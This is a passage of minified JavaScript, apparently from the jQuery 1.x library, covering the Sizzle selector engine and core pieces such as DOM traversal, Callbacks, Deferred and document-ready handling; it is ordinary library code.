RegExp("^(?:"+K+")$","i"),needsContext:new RegExp("^"+L+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+L+"*((?:-\\d)?\\d*)"+L+"*\\)|)(?=[^-]|$)","i")},Y=/^(?:input|select|textarea|button)$/i,Z=/^h\d$/i,$=/^[^{]+\{\s*\[native \w/,_=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,ab=/[+~]/,bb=/'|\\/g,cb=new RegExp("\\\\([\\da-f]{1,6}"+L+"?|("+L+")|.)","ig"),db=function(a,b,c){var d="0x"+b-65536;return d!==d||c?b:0>d?String.fromCharCode(d+65536):String.fromCharCode(d>>10|55296,1023&d|56320)},eb=function(){m()};try{H.apply(E=I.call(v.childNodes),v.childNodes),E[v.childNodes.length].nodeType}catch(fb){H={apply:E.length?function(a,b){G.apply(a,I.call(b))}:function(a,b){var c=a.length,d=0;while(a[c++]=b[d++]);a.length=c-1}}}function gb(a,b,d,e){var f,h,j,k,l,o,r,s,w,x;if((b?b.ownerDocument||b:v)!==n&&m(b),b=b||n,d=d||[],k=b.nodeType,"string"!=typeof a||!a||1!==k&&9!==k&&11!==k)return d;if(!e&&p){if(11!==k&&(f=_.exec(a)))if(j=f[1]){if(9===k){if(h=b.getElementById(j),!h||!h.parentNode)return d;if(h.id===j)return d.push(h),d}else if(b.ownerDocument&&(h=b.ownerDocument.getElementById(j))&&t(b,h)&&h.id===j)return d.push(h),d}else{if(f[2])return H.apply(d,b.getElementsByTagName(a)),d;if((j=f[3])&&c.getElementsByClassName)return H.apply(d,b.getElementsByClassName(j)),d}if(c.qsa&&(!q||!q.test(a))){if(s=r=u,w=b,x=1!==k&&a,1===k&&"object"!==b.nodeName.toLowerCase()){o=g(a),(r=b.getAttribute("id"))?s=r.replace(bb,"\\$&"):b.setAttribute("id",s),s="[id='"+s+"'] ",l=o.length;while(l--)o[l]=s+rb(o[l]);w=ab.test(a)&&pb(b.parentNode)||b,x=o.join(",")}if(x)try{return H.apply(d,w.querySelectorAll(x)),d}catch(y){}finally{r||b.removeAttribute("id")}}}return i(a.replace(R,"$1"),b,d,e)}function hb(){var a=[];function b(c,e){return a.push(c+" ")>d.cacheLength&&delete b[a.shift()],b[c+" "]=e}return b}function ib(a){return a[u]=!0,a}function jb(a){var b=n.createElement("div");try{return!!a(b)}catch(c){return!1}finally{b.parentNode&&b.parentNode.removeChild(b),b=null}}function kb(a,b){var c=a.split("|"),e=a.length;while(e--)d.attrHandle[c[e]]=b}function lb(a,b){var c=b&&a,d=c&&1===a.nodeType&&1===b.nodeType&&(~b.sourceIndex||C)-(~a.sourceIndex||C);if(d)return d;if(c)while(c=c.nextSibling)if(c===b)return-1;return a?1:-1}function mb(a){return function(b){var c=b.nodeName.toLowerCase();return"input"===c&&b.type===a}}function nb(a){return function(b){var c=b.nodeName.toLowerCase();return("input"===c||"button"===c)&&b.type===a}}function ob(a){return ib(function(b){return b=+b,ib(function(c,d){var e,f=a([],c.length,b),g=f.length;while(g--)c[e=f[g]]&&(c[e]=!(d[e]=c[e]))})})}function pb(a){return a&&"undefined"!=typeof a.getElementsByTagName&&a}c=gb.support={},f=gb.isXML=function(a){var b=a&&(a.ownerDocument||a).documentElement;return b?"HTML"!==b.nodeName:!1},m=gb.setDocument=function(a){var b,e,g=a?a.ownerDocument||a:v;return g!==n&&9===g.nodeType&&g.documentElement?(n=g,o=g.documentElement,e=g.defaultView,e&&e!==e.top&&(e.addEventListener?e.addEventListener("unload",eb,!1):e.attachEvent&&e.attachEvent("onunload",eb)),p=!f(g),c.attributes=jb(function(a){return a.className="i",!a.getAttribute("className")}),c.getElementsByTagName=jb(function(a){return a.appendChild(g.createComment("")),!a.getElementsByTagName("*").length}),c.getElementsByClassName=$.test(g.getElementsByClassName),c.getById=jb(function(a){return o.appendChild(a).id=u,!g.getElementsByName||!g.getElementsByName(u).length}),c.getById?(d.find.ID=function(a,b){if("undefined"!=typeof b.getElementById&&p){var c=b.getElementById(a);return c&&c.parentNode?[c]:[]}},d.filter.ID=function(a){var b=a.replace(cb,db);return function(a){return a.getAttribute("id")===b}}):(delete d.find.ID,d.filter.ID=function(a){var b=a.replace(cb,db);return function(a){var c="undefined"!=typeof a.getAttributeNode&&a.getAttributeNode("id");return c&&c.value===b}}),d.find.TAG=c.getElementsByTagName?function(a,b){return"undefined"!=typeof b.getElementsByTagName?b.getElementsByTagName(a):c.qsa?b.querySelectorAll(a):void 0}:function(a,b){var c,d=[],e=0,f=b.getElementsByTagName(a);if("*"===a){while(c=f[e++])1===c.nodeType&&d.push(c);return d}return f},d.find.CLASS=c.getElementsByClassName&&function(a,b){return p?b.getElementsByClassName(a):void 0},r=[],q=[],(c.qsa=$.test(g.querySelectorAll))&&(jb(function(a){o.appendChild(a).innerHTML="<a id='"+u+"'></a><select id='"+u+"-\f]' msallowcapture=''><option selected=''></option></select>",a.querySelectorAll("[msallowcapture^='']").length&&q.push("[*^$]="+L+"*(?:''|\"\")"),a.querySelectorAll("[selected]").length||q.push("\\["+L+"*(?:value|"+K+")"),a.querySelectorAll("[id~="+u+"-]").length||q.push("~="),a.querySelectorAll(":checked").length||q.push(":checked"),a.querySelectorAll("a#"+u+"+*").length||q.push(".#.+[+~]")}),jb(function(a){var b=g.createElement("input");b.setAttribute("type","hidden"),a.appendChild(b).setAttribute("name","D"),a.querySelectorAll("[name=d]").length&&q.push("name"+L+"*[*^$|!~]?="),a.querySelectorAll(":enabled").length||q.push(":enabled",":disabled"),a.querySelectorAll("*,:x"),q.push(",.*:")})),(c.matchesSelector=$.test(s=o.matches||o.webkitMatchesSelector||o.mozMatchesSelector||o.oMatchesSelector||o.msMatchesSelector))&&jb(function(a){c.disconnectedMatch=s.call(a,"div"),s.call(a,"[s!='']:x"),r.push("!=",P)}),q=q.length&&new RegExp(q.join("|")),r=r.length&&new RegExp(r.join("|")),b=$.test(o.compareDocumentPosition),t=b||$.test(o.contains)?function(a,b){var c=9===a.nodeType?a.documentElement:a,d=b&&b.parentNode;return a===d||!(!d||1!==d.nodeType||!(c.contains?c.contains(d):a.compareDocumentPosition&&16&a.compareDocumentPosition(d)))}:function(a,b){if(b)while(b=b.parentNode)if(b===a)return!0;return!1},B=b?function(a,b){if(a===b)return l=!0,0;var d=!a.compareDocumentPosition-!b.compareDocumentPosition;return d?d:(d=(a.ownerDocument||a)===(b.ownerDocument||b)?a.compareDocumentPosition(b):1,1&d||!c.sortDetached&&b.compareDocumentPosition(a)===d?a===g||a.ownerDocument===v&&t(v,a)?-1:b===g||b.ownerDocument===v&&t(v,b)?1:k?J(k,a)-J(k,b):0:4&d?-1:1)}:function(a,b){if(a===b)return l=!0,0;var c,d=0,e=a.parentNode,f=b.parentNode,h=[a],i=[b];if(!e||!f)return a===g?-1:b===g?1:e?-1:f?1:k?J(k,a)-J(k,b):0;if(e===f)return lb(a,b);c=a;while(c=c.parentNode)h.unshift(c);c=b;while(c=c.parentNode)i.unshift(c);while(h[d]===i[d])d++;return d?lb(h[d],i[d]):h[d]===v?-1:i[d]===v?1:0},g):n},gb.matches=function(a,b){return gb(a,null,null,b)},gb.matchesSelector=function(a,b){if((a.ownerDocument||a)!==n&&m(a),b=b.replace(U,"='$1']"),!(!c.matchesSelector||!p||r&&r.test(b)||q&&q.test(b)))try{var d=s.call(a,b);if(d||c.disconnectedMatch||a.document&&11!==a.document.nodeType)return d}catch(e){}return gb(b,n,null,[a]).length>0},gb.contains=function(a,b){return(a.ownerDocument||a)!==n&&m(a),t(a,b)},gb.attr=function(a,b){(a.ownerDocument||a)!==n&&m(a);var e=d.attrHandle[b.toLowerCase()],f=e&&D.call(d.attrHandle,b.toLowerCase())?e(a,b,!p):void 0;return void 0!==f?f:c.attributes||!p?a.getAttribute(b):(f=a.getAttributeNode(b))&&f.specified?f.value:null},gb.error=function(a){throw new Error("Syntax error, unrecognized expression: "+a)},gb.uniqueSort=function(a){var b,d=[],e=0,f=0;if(l=!c.detectDuplicates,k=!c.sortStable&&a.slice(0),a.sort(B),l){while(b=a[f++])b===a[f]&&(e=d.push(f));while(e--)a.splice(d[e],1)}return k=null,a},e=gb.getText=function(a){var b,c="",d=0,f=a.nodeType;if(f){if(1===f||9===f||11===f){if("string"==typeof a.textContent)return a.textContent;for(a=a.firstChild;a;a=a.nextSibling)c+=e(a)}else if(3===f||4===f)return a.nodeValue}else while(b=a[d++])c+=e(b);return c},d=gb.selectors={cacheLength:50,createPseudo:ib,match:X,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(a){return a[1]=a[1].replace(cb,db),a[3]=(a[3]||a[4]||a[5]||"").replace(cb,db),"~="===a[2]&&(a[3]=" "+a[3]+" "),a.slice(0,4)},CHILD:function(a){return a[1]=a[1].toLowerCase(),"nth"===a[1].slice(0,3)?(a[3]||gb.error(a[0]),a[4]=+(a[4]?a[5]+(a[6]||1):2*("even"===a[3]||"odd"===a[3])),a[5]=+(a[7]+a[8]||"odd"===a[3])):a[3]&&gb.error(a[0]),a},PSEUDO:function(a){var b,c=!a[6]&&a[2];return X.CHILD.test(a[0])?null:(a[3]?a[2]=a[4]||a[5]||"":c&&V.test(c)&&(b=g(c,!0))&&(b=c.indexOf(")",c.length-b)-c.length)&&(a[0]=a[0].slice(0,b),a[2]=c.slice(0,b)),a.slice(0,3))}},filter:{TAG:function(a){var b=a.replace(cb,db).toLowerCase();return"*"===a?function(){return!0}:function(a){return a.nodeName&&a.nodeName.toLowerCase()===b}},CLASS:function(a){var b=y[a+" "];return b||(b=new RegExp("(^|"+L+")"+a+"("+L+"|$)"))&&y(a,function(a){return b.test("string"==typeof a.className&&a.className||"undefined"!=typeof a.getAttribute&&a.getAttribute("class")||"")})},ATTR:function(a,b,c){return function(d){var e=gb.attr(d,a);return null==e?"!="===b:b?(e+="","="===b?e===c:"!="===b?e!==c:"^="===b?c&&0===e.indexOf(c):"*="===b?c&&e.indexOf(c)>-1:"$="===b?c&&e.slice(-c.length)===c:"~="===b?(" "+e.replace(Q," ")+" ").indexOf(c)>-1:"|="===b?e===c||e.slice(0,c.length+1)===c+"-":!1):!0}},CHILD:function(a,b,c,d,e){var f="nth"!==a.slice(0,3),g="last"!==a.slice(-4),h="of-type"===b;return 1===d&&0===e?function(a){return!!a.parentNode}:function(b,c,i){var j,k,l,m,n,o,p=f!==g?"nextSibling":"previousSibling",q=b.parentNode,r=h&&b.nodeName.toLowerCase(),s=!i&&!h;if(q){if(f){while(p){l=b;while(l=l[p])if(h?l.nodeName.toLowerCase()===r:1===l.nodeType)return!1;o=p="only"===a&&!o&&"nextSibling"}return!0}if(o=[g?q.firstChild:q.lastChild],g&&s){k=q[u]||(q[u]={}),j=k[a]||[],n=j[0]===w&&j[1],m=j[0]===w&&j[2],l=n&&q.childNodes[n];while(l=++n&&l&&l[p]||(m=n=0)||o.pop())if(1===l.nodeType&&++m&&l===b){k[a]=[w,n,m];break}}else if(s&&(j=(b[u]||(b[u]={}))[a])&&j[0]===w)m=j[1];else while(l=++n&&l&&l[p]||(m=n=0)||o.pop())if((h?l.nodeName.toLowerCase()===r:1===l.nodeType)&&++m&&(s&&((l[u]||(l[u]={}))[a]=[w,m]),l===b))break;return m-=e,m===d||m%d===0&&m/d>=0}}},PSEUDO:function(a,b){var c,e=d.pseudos[a]||d.setFilters[a.toLowerCase()]||gb.error("unsupported pseudo: "+a);return e[u]?e(b):e.length>1?(c=[a,a,"",b],d.setFilters.hasOwnProperty(a.toLowerCase())?ib(function(a,c){var d,f=e(a,b),g=f.length;while(g--)d=J(a,f[g]),a[d]=!(c[d]=f[g])}):function(a){return e(a,0,c)}):e}},pseudos:{not:ib(function(a){var b=[],c=[],d=h(a.replace(R,"$1"));return d[u]?ib(function(a,b,c,e){var f,g=d(a,null,e,[]),h=a.length;while(h--)(f=g[h])&&(a[h]=!(b[h]=f))}):function(a,e,f){return b[0]=a,d(b,null,f,c),b[0]=null,!c.pop()}}),has:ib(function(a){return function(b){return gb(a,b).length>0}}),contains:ib(function(a){return a=a.replace(cb,db),function(b){return(b.textContent||b.innerText||e(b)).indexOf(a)>-1}}),lang:ib(function(a){return W.test(a||"")||gb.error("unsupported lang: "+a),a=a.replace(cb,db).toLowerCase(),function(b){var c;do if(c=p?b.lang:b.getAttribute("xml:lang")||b.getAttribute("lang"))return c=c.toLowerCase(),c===a||0===c.indexOf(a+"-");while((b=b.parentNode)&&1===b.nodeType);return!1}}),target:function(b){var c=a.location&&a.location.hash;return c&&c.slice(1)===b.id},root:function(a){return a===o},focus:function(a){return a===n.activeElement&&(!n.hasFocus||n.hasFocus())&&!!(a.type||a.href||~a.tabIndex)},enabled:function(a){return a.disabled===!1},disabled:function(a){return a.disabled===!0},checked:function(a){var b=a.nodeName.toLowerCase();return"input"===b&&!!a.checked||"option"===b&&!!a.selected},selected:function(a){return a.parentNode&&a.parentNode.selectedIndex,a.selected===!0},empty:function(a){for(a=a.firstChild;a;a=a.nextSibling)if(a.nodeType<6)return!1;return!0},parent:function(a){return!d.pseudos.empty(a)},header:function(a){return Z.test(a.nodeName)},input:function(a){return Y.test(a.nodeName)},button:function(a){var b=a.nodeName.toLowerCase();return"input"===b&&"button"===a.type||"button"===b},text:function(a){var b;return"input"===a.nodeName.toLowerCase()&&"text"===a.type&&(null==(b=a.getAttribute("type"))||"text"===b.toLowerCase())},first:ob(function(){return[0]}),last:ob(function(a,b){return[b-1]}),eq:ob(function(a,b,c){return[0>c?c+b:c]}),even:ob(function(a,b){for(var c=0;b>c;c+=2)a.push(c);return a}),odd:ob(function(a,b){for(var c=1;b>c;c+=2)a.push(c);return a}),lt:ob(function(a,b,c){for(var d=0>c?c+b:c;--d>=0;)a.push(d);return a}),gt:ob(function(a,b,c){for(var d=0>c?c+b:c;++d<b;)a.push(d);return a})}},d.pseudos.nth=d.pseudos.eq;for(b in{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})d.pseudos[b]=mb(b);for(b in{submit:!0,reset:!0})d.pseudos[b]=nb(b);function qb(){}qb.prototype=d.filters=d.pseudos,d.setFilters=new qb,g=gb.tokenize=function(a,b){var c,e,f,g,h,i,j,k=z[a+" "];if(k)return b?0:k.slice(0);h=a,i=[],j=d.preFilter;while(h){(!c||(e=S.exec(h)))&&(e&&(h=h.slice(e[0].length)||h),i.push(f=[])),c=!1,(e=T.exec(h))&&(c=e.shift(),f.push({value:c,type:e[0].replace(R," ")}),h=h.slice(c.length));for(g in d.filter)!(e=X[g].exec(h))||j[g]&&!(e=j[g](e))||(c=e.shift(),f.push({value:c,type:g,matches:e}),h=h.slice(c.length));if(!c)break}return b?h.length:h?gb.error(a):z(a,i).slice(0)};function rb(a){for(var b=0,c=a.length,d="";c>b;b++)d+=a[b].value;return d}function sb(a,b,c){var d=b.dir,e=c&&"parentNode"===d,f=x++;return b.first?function(b,c,f){while(b=b[d])if(1===b.nodeType||e)return a(b,c,f)}:function(b,c,g){var h,i,j=[w,f];if(g){while(b=b[d])if((1===b.nodeType||e)&&a(b,c,g))return!0}else while(b=b[d])if(1===b.nodeType||e){if(i=b[u]||(b[u]={}),(h=i[d])&&h[0]===w&&h[1]===f)return j[2]=h[2];if(i[d]=j,j[2]=a(b,c,g))return!0}}}function tb(a){return a.length>1?function(b,c,d){var e=a.length;while(e--)if(!a[e](b,c,d))return!1;return!0}:a[0]}function ub(a,b,c){for(var d=0,e=b.length;e>d;d++)gb(a,b[d],c);return c}function vb(a,b,c,d,e){for(var f,g=[],h=0,i=a.length,j=null!=b;i>h;h++)(f=a[h])&&(!c||c(f,d,e))&&(g.push(f),j&&b.push(h));return g}function wb(a,b,c,d,e,f){return d&&!d[u]&&(d=wb(d)),e&&!e[u]&&(e=wb(e,f)),ib(function(f,g,h,i){var j,k,l,m=[],n=[],o=g.length,p=f||ub(b||"*",h.nodeType?[h]:h,[]),q=!a||!f&&b?p:vb(p,m,a,h,i),r=c?e||(f?a:o||d)?[]:g:q;if(c&&c(q,r,h,i),d){j=vb(r,n),d(j,[],h,i),k=j.length;while(k--)(l=j[k])&&(r[n[k]]=!(q[n[k]]=l))}if(f){if(e||a){if(e){j=[],k=r.length;while(k--)(l=r[k])&&j.push(q[k]=l);e(null,r=[],j,i)}k=r.length;while(k--)(l=r[k])&&(j=e?J(f,l):m[k])>-1&&(f[j]=!(g[j]=l))}}else r=vb(r===g?r.splice(o,r.length):r),e?e(null,g,r,i):H.apply(g,r)})}function xb(a){for(var b,c,e,f=a.length,g=d.relative[a[0].type],h=g||d.relative[" "],i=g?1:0,k=sb(function(a){return a===b},h,!0),l=sb(function(a){return J(b,a)>-1},h,!0),m=[function(a,c,d){var e=!g&&(d||c!==j)||((b=c).nodeType?k(a,c,d):l(a,c,d));return b=null,e}];f>i;i++)if(c=d.relative[a[i].type])m=[sb(tb(m),c)];else{if(c=d.filter[a[i].type].apply(null,a[i].matches),c[u]){for(e=++i;f>e;e++)if(d.relative[a[e].type])break;return wb(i>1&&tb(m),i>1&&rb(a.slice(0,i-1).concat({value:" "===a[i-2].type?"*":""})).replace(R,"$1"),c,e>i&&xb(a.slice(i,e)),f>e&&xb(a=a.slice(e)),f>e&&rb(a))}m.push(c)}return tb(m)}function yb(a,b){var c=b.length>0,e=a.length>0,f=function(f,g,h,i,k){var l,m,o,p=0,q="0",r=f&&[],s=[],t=j,u=f||e&&d.find.TAG("*",k),v=w+=null==t?1:Math.random()||.1,x=u.length;for(k&&(j=g!==n&&g);q!==x&&null!=(l=u[q]);q++){if(e&&l){m=0;while(o=a[m++])if(o(l,g,h)){i.push(l);break}k&&(w=v)}c&&((l=!o&&l)&&p--,f&&r.push(l))}if(p+=q,c&&q!==p){m=0;while(o=b[m++])o(r,s,g,h);if(f){if(p>0)while(q--)r[q]||s[q]||(s[q]=F.call(i));s=vb(s)}H.apply(i,s),k&&!f&&s.length>0&&p+b.length>1&&gb.uniqueSort(i)}return k&&(w=v,j=t),r};return c?ib(f):f}return h=gb.compile=function(a,b){var c,d=[],e=[],f=A[a+" "];if(!f){b||(b=g(a)),c=b.length;while(c--)f=xb(b[c]),f[u]?d.push(f):e.push(f);f=A(a,yb(e,d)),f.selector=a}return f},i=gb.select=function(a,b,e,f){var i,j,k,l,m,n="function"==typeof a&&a,o=!f&&g(a=n.selector||a);if(e=e||[],1===o.length){if(j=o[0]=o[0].slice(0),j.length>2&&"ID"===(k=j[0]).type&&c.getById&&9===b.nodeType&&p&&d.relative[j[1].type]){if(b=(d.find.ID(k.matches[0].replace(cb,db),b)||[])[0],!b)return e;n&&(b=b.parentNode),a=a.slice(j.shift().value.length)}i=X.needsContext.test(a)?0:j.length;while(i--){if(k=j[i],d.relative[l=k.type])break;if((m=d.find[l])&&(f=m(k.matches[0].replace(cb,db),ab.test(j[0].type)&&pb(b.parentNode)||b))){if(j.splice(i,1),a=f.length&&rb(j),!a)return H.apply(e,f),e;break}}}return(n||h(a,o))(f,b,!p,e,ab.test(a)&&pb(b.parentNode)||b),e},c.sortStable=u.split("").sort(B).join("")===u,c.detectDuplicates=!!l,m(),c.sortDetached=jb(function(a){return 1&a.compareDocumentPosition(n.createElement("div"))}),jb(function(a){return a.innerHTML="<a href='#'></a>","#"===a.firstChild.getAttribute("href")})||kb("type|href|height|width",function(a,b,c){return c?void 0:a.getAttribute(b,"type"===b.toLowerCase()?1:2)}),c.attributes&&jb(function(a){return a.innerHTML="<input/>",a.firstChild.setAttribute("value",""),""===a.firstChild.getAttribute("value")})||kb("value",function(a,b,c){return c||"input"!==a.nodeName.toLowerCase()?void 0:a.defaultValue}),jb(function(a){return null==a.getAttribute("disabled")})||kb(K,function(a,b,c){var d;return c?void 0:a[b]===!0?b.toLowerCase():(d=a.getAttributeNode(b))&&d.specified?d.value:null}),gb}(a);m.find=s,m.expr=s.selectors,m.expr[":"]=m.expr.pseudos,m.unique=s.uniqueSort,m.text=s.getText,m.isXMLDoc=s.isXML,m.contains=s.contains;var t=m.expr.match.needsContext,u=/^<(\w+)\s*\/?>(?:<\/\1>|)$/,v=/^.[^:#\[\.,]*$/;function w(a,b,c){if(m.isFunction(b))return m.grep(a,function(a,d){return!!b.call(a,d,a)!==c});if(b.nodeType)return m.grep(a,function(a){return a===b!==c});if("string"==typeof b){if(v.test(b))return m.filter(b,a,c);b=m.filter(b,a)}return m.grep(a,function(a){return m.inArray(a,b)>=0!==c})}m.filter=function(a,b,c){var d=b[0];return c&&(a=":not("+a+")"),1===b.length&&1===d.nodeType?m.find.matchesSelector(d,a)?[d]:[]:m.find.matches(a,m.grep(b,function(a){return 1===a.nodeType}))},m.fn.extend({find:function(a){var b,c=[],d=this,e=d.length;if("string"!=typeof a)return this.pushStack(m(a).filter(function(){for(b=0;e>b;b++)if(m.contains(d[b],this))return!0}));for(b=0;e>b;b++)m.find(a,d[b],c);return c=this.pushStack(e>1?m.unique(c):c),c.selector=this.selector?this.selector+" "+a:a,c},filter:function(a){return this.pushStack(w(this,a||[],!1))},not:function(a){return this.pushStack(w(this,a||[],!0))},is:function(a){return!!w(this,"string"==typeof a&&t.test(a)?m(a):a||[],!1).length}});var x,y=a.document,z=/^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/,A=m.fn.init=function(a,b){var c,d;if(!a)return this;if("string"==typeof a){if(c="<"===a.charAt(0)&&">"===a.charAt(a.length-1)&&a.length>=3?[null,a,null]:z.exec(a),!c||!c[1]&&b)return!b||b.jquery?(b||x).find(a):this.constructor(b).find(a);if(c[1]){if(b=b instanceof m?b[0]:b,m.merge(this,m.parseHTML(c[1],b&&b.nodeType?b.ownerDocument||b:y,!0)),u.test(c[1])&&m.isPlainObject(b))for(c in b)m.isFunction(this[c])?this[c](b[c]):this.attr(c,b[c]);return this}if(d=y.getElementById(c[2]),d&&d.parentNode){if(d.id!==c[2])return x.find(a);this.length=1,this[0]=d}return this.context=y,this.selector=a,this}return a.nodeType?(this.context=this[0]=a,this.length=1,this):m.isFunction(a)?"undefined"!=typeof x.ready?x.ready(a):a(m):(void 0!==a.selector&&(this.selector=a.selector,this.context=a.context),m.makeArray(a,this))};A.prototype=m.fn,x=m(y);var B=/^(?:parents|prev(?:Until|All))/,C={children:!0,contents:!0,next:!0,prev:!0};m.extend({dir:function(a,b,c){var d=[],e=a[b];while(e&&9!==e.nodeType&&(void 0===c||1!==e.nodeType||!m(e).is(c)))1===e.nodeType&&d.push(e),e=e[b];return d},sibling:function(a,b){for(var c=[];a;a=a.nextSibling)1===a.nodeType&&a!==b&&c.push(a);return c}}),m.fn.extend({has:function(a){var b,c=m(a,this),d=c.length;return this.filter(function(){for(b=0;d>b;b++)if(m.contains(this,c[b]))return!0})},closest:function(a,b){for(var c,d=0,e=this.length,f=[],g=t.test(a)||"string"!=typeof a?m(a,b||this.context):0;e>d;d++)for(c=this[d];c&&c!==b;c=c.parentNode)if(c.nodeType<11&&(g?g.index(c)>-1:1===c.nodeType&&m.find.matchesSelector(c,a))){f.push(c);break}return this.pushStack(f.length>1?m.unique(f):f)},index:function(a){return a?"string"==typeof a?m.inArray(this[0],m(a)):m.inArray(a.jquery?a[0]:a,this):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(a,b){return this.pushStack(m.unique(m.merge(this.get(),m(a,b))))},addBack:function(a){return this.add(null==a?this.prevObject:this.prevObject.filter(a))}});function D(a,b){do a=a[b];while(a&&1!==a.nodeType);return a}m.each({parent:function(a){var b=a.parentNode;return b&&11!==b.nodeType?b:null},parents:function(a){return m.dir(a,"parentNode")},parentsUntil:function(a,b,c){return m.dir(a,"parentNode",c)},next:function(a){return D(a,"nextSibling")},prev:function(a){return D(a,"previousSibling")},nextAll:function(a){return m.dir(a,"nextSibling")},prevAll:function(a){return m.dir(a,"previousSibling")},nextUntil:function(a,b,c){return m.dir(a,"nextSibling",c)},prevUntil:function(a,b,c){return m.dir(a,"previousSibling",c)},siblings:function(a){return m.sibling((a.parentNode||{}).firstChild,a)},children:function(a){return m.sibling(a.firstChild)},contents:function(a){return m.nodeName(a,"iframe")?a.contentDocument||a.contentWindow.document:m.merge([],a.childNodes)}},function(a,b){m.fn[a]=function(c,d){var e=m.map(this,b,c);return"Until"!==a.slice(-5)&&(d=c),d&&"string"==typeof d&&(e=m.filter(d,e)),this.length>1&&(C[a]||(e=m.unique(e)),B.test(a)&&(e=e.reverse())),this.pushStack(e)}});var E=/\S+/g,F={};function G(a){var b=F[a]={};return m.each(a.match(E)||[],function(a,c){b[c]=!0}),b}m.Callbacks=function(a){a="string"==typeof a?F[a]||G(a):m.extend({},a);var b,c,d,e,f,g,h=[],i=!a.once&&[],j=function(l){for(c=a.memory&&l,d=!0,f=g||0,g=0,e=h.length,b=!0;h&&e>f;f++)if(h[f].apply(l[0],l[1])===!1&&a.stopOnFalse){c=!1;break}b=!1,h&&(i?i.length&&j(i.shift()):c?h=[]:k.disable())},k={add:function(){if(h){var d=h.length;!function f(b){m.each(b,function(b,c){var d=m.type(c);"function"===d?a.unique&&k.has(c)||h.push(c):c&&c.length&&"string"!==d&&f(c)})}(arguments),b?e=h.length:c&&(g=d,j(c))}return this},remove:function(){return h&&m.each(arguments,function(a,c){var d;while((d=m.inArray(c,h,d))>-1)h.splice(d,1),b&&(e>=d&&e--,f>=d&&f--)}),this},has:function(a){return a?m.inArray(a,h)>-1:!(!h||!h.length)},empty:function(){return h=[],e=0,this},disable:function(){return h=i=c=void 0,this},disabled:function(){return!h},lock:function(){return i=void 0,c||k.disable(),this},locked:function(){return!i},fireWith:function(a,c){return!h||d&&!i||(c=c||[],c=[a,c.slice?c.slice():c],b?i.push(c):j(c)),this},fire:function(){return k.fireWith(this,arguments),this},fired:function(){return!!d}};return k},m.extend({Deferred:function(a){var b=[["resolve","done",m.Callbacks("once memory"),"resolved"],["reject","fail",m.Callbacks("once memory"),"rejected"],["notify","progress",m.Callbacks("memory")]],c="pending",d={state:function(){return c},always:function(){return e.done(arguments).fail(arguments),this},then:function(){var a=arguments;return m.Deferred(function(c){m.each(b,function(b,f){var g=m.isFunction(a[b])&&a[b];e[f[1]](function(){var a=g&&g.apply(this,arguments);a&&m.isFunction(a.promise)?a.promise().done(c.resolve).fail(c.reject).progress(c.notify):c[f[0]+"With"](this===d?c.promise():this,g?[a]:arguments)})}),a=null}).promise()},promise:function(a){return null!=a?m.extend(a,d):d}},e={};return d.pipe=d.then,m.each(b,function(a,f){var g=f[2],h=f[3];d[f[1]]=g.add,h&&g.add(function(){c=h},b[1^a][2].disable,b[2][2].lock),e[f[0]]=function(){return e[f[0]+"With"](this===e?d:this,arguments),this},e[f[0]+"With"]=g.fireWith}),d.promise(e),a&&a.call(e,e),e},when:function(a){var b=0,c=d.call(arguments),e=c.length,f=1!==e||a&&m.isFunction(a.promise)?e:0,g=1===f?a:m.Deferred(),h=function(a,b,c){return function(e){b[a]=this,c[a]=arguments.length>1?d.call(arguments):e,c===i?g.notifyWith(b,c):--f||g.resolveWith(b,c)}},i,j,k;if(e>1)for(i=new Array(e),j=new Array(e),k=new Array(e);e>b;b++)c[b]&&m.isFunction(c[b].promise)?c[b].promise().done(h(b,k,c)).fail(g.reject).progress(h(b,j,i)):--f;return f||g.resolveWith(k,c),g.promise()}});var H;m.fn.ready=function(a){return m.ready.promise().done(a),this},m.extend({isReady:!1,readyWait:1,holdReady:function(a){a?m.readyWait++:m.ready(!0)},ready:function(a){if(a===!0?!--m.readyWait:!m.isReady){if(!y.body)return setTimeout(m.ready);m.isReady=!0,a!==!0&&--m.readyWait>0||(H.resolveWith(y,[m]),m.fn.triggerHandler&&(m(y).triggerHandler("ready"),m(y).off("ready")))}}});function I(){y.addEventListener?(y.removeEventListener("DOMContentLoaded",J,!1),a.removeEventListener("load",J,!1)):(y.detachEvent("onreadystatechange",J),a.detachEvent("onload",J))}function J(){(y.addEventListener||"load"===event.type||"complete"===y.readyState)&&(I(),m.ready())}m.ready.promise=function(b){if(!H)if(H=m.Deferred(),"complete"===y.readyState)setTimeout(m.ready);else if(y.addEventListener)y.addEventListener("DOMContentLoaded",J,!1),a.addEventListener("load",J,!1);else{y.attachEvent("onreadystatechange",J),a.attachEvent("onload",J);var c=!1;try{c=null==a.frameElement&&y.documentElement}catch(d){}c&&c.doScroll&&!function e(){if(!m.isReady){try{c.doScroll("left")}catch(a){return setTimeout(e,50)}I(),m.ready()}}()}return H.promise(b)};var K="undefined",L;for(L in m(k))break;k.ownLast="0"!==L,k.inlineBlockNeedsLayout=!1,m(function(){var a,b,c,d;c=y.getElementsByTagName("body")[0],c&&c.style&&(b=y.createElement("div"),d=y.createElement("div"),d.style.cssText="position:absolute;border:0;width:0;height:0;top:0;left:-9999px",c.appendChild(d).appendChild(b),typeof b.style.zoom!==K&&(b.style.cssText="display:inline;margin:0;border:0;padding:1px;width:1px;zoom:1",k.inlineBlockNeedsLayout=a=3===b.offsetWidth,a&&(c.style.zoom=1)),c.removeChild(d))}),function(){var a=y.createElement("div");if(null==k.deleteExpando){k.deleteExpando=!0;try{delete a.test}catch(b){k.deleteExpando=!1}}a=null}(),m.acceptData=function(a){var b=m.noData[(a.nodeName+" ").toLowerCase()],c=+a.nodeType||1;return 1!==c&&9!==c?!1:!b||b!==!0&&a.getAttribute("classid")===b};var M=/^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,N=/([A-Z])/g;function O(a,b,c){if(void 0===c&&1===a.nodeType){var d="data-"+b.replace(N,"-$1").toLowerCase();if(c=a.getAttribute(d),"string"==typeof c){try{c="true"===c?!0:"false"===c?!1:"null"===c?null:+c+""===c?+c:M.test(c)?m.parseJSON(c):c}catch(e){}m.data(a,b,c)}else c=void 0}return c}function P(a){var 